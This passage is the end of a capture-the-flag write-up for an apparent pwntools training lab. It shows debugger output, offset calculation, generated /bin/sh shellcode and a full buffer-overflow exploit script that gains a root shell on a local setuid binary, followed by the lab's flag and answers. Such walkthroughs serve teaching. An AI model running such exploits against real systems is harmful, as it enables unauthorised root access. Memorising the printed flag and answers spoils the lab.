02:0008│     0xffffd468 ◂— 'waaaxaaayaaa'
03:000c│     0xffffd46c ◂— 'xaaayaaa'
04:0010│     0xffffd470 ◂— 'yaaa'
05:0014│ edx 0xffffd474 —▸ 0xf7fba000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c
06:0018│     0xffffd478 ◂— 0x0
07:001c│     0xffffd47c —▸ 0xf7de9ed5 (__libc_start_main+245) ◂— add    esp, 0x10
──────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────────────────────────────────────────────────────────
 ► f 0 0x61616174
   f 1 0x61616175
   f 2 0x61616176
   f 3 0x61616177
   f 4 0x61616178
   f 5 0x61616179
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> exit
Undefined command: "exit".  Try "help".
pwndbg> quit
buzz@ip-10-48-135-178:~/IntroToPwntools/IntroToPwntools/shellcraft$ cyclic -l taaa
76
buzz@ip-10-48-135-178:~/IntroToPwntools/IntroToPwntools/shellcraft$ shellcraft i386.linux.sh -f s
"jhh\x2f\x2f\x2fsh\x2fbin\x89\xe3h\x01\x01\x01\x01\x814\x24ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80"
buzz@ip-10-48-135-178:~/IntroToPwntools/IntroToPwntools/shellcraft$ cat > s.py
from pwn import *



p = process("./intro2pwnFinal")



padding = cyclic(76)

eip = p32(0xffffd528)

nop_slide = b"\x90" * 1000

shellcode = b"jhh\x2f\x2f\x2fsh\x2fbin\x89\xe3jph\x01\x01\x01\x01\x814\x24ri\x01,1\xc9Qj\x07Y\x01\xe1Qj\x08Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80"



payload = padding + eip + nop_slide + shellcode



p.send(payload)

p.interactive()
^C
buzz@ip-10-48-135-178:~/IntroToPwntools/IntroToPwntools/shellcraft$ python3 s.py
[+] Starting local process './intro2pwnFinal': pid 2871
[*] Switching to interactive mode
Hello There. Do you have an input for me?
$ whami
$ id
uid=1001(buzz) gid=1001(buzz) euid=0(root) groups=1001(buzz)
$ whoami
root
```

> root

**What is the flag?**

```
$ cat flag.txt
flag{pwn!ng_!$_fr33d0m}
```

> flag{pwn!ng_!$_fr33d0m}

### Task 7 - Conclusion

*2 min read with gud resources..*

**I have learned the basics of pwntools, and I am now a 1337 h4x0r!**

> No ans needed
